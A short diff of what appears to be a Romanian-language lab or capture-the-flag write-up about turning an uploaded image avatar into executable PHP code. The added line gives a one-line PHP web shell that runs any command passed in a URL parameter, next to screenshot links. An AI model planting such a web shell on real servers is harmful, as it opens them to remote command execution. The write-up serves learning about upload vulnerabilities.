@@ -10,4 +10,7 @@ Astfel, acum dintr-un avatar de tip imagine avem un cod php.
 
 ![](../../attachments/Pasted%20image%2020261019133202.png)
 
-Am folosit `<? p`
+Am folosit `<?php echo system($_GET['command']); ?>`
+
+![](../../attachments/Pasted%20image%2020261019133303.png)
+
